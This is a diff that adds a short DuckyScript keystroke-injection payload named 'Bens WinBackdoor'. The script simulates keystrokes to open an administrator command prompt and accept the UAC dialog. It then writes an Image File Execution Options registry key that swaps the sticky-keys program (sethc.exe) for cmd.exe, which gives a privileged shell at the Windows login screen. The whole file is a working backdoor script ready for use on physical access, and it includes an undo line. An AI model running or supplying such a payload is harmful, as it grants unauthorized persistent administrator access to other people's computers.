@@ -1,0 +1,22 @@
+REM Title: Bens WinBackdoor
+REM Note: Adjust delays to match host CPU speed
+REM To Undo: REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+
+REM UAC CMD Bypass
+DELAY 2000
+CONTROL ESCAPE
+DELAY 300
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 600
+
+REM Registry Key Backdoor
+STRING REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
+DELAY 300
+ENTER
+DELAY 300
+STRING exit
+DELAY 300
+ENTER
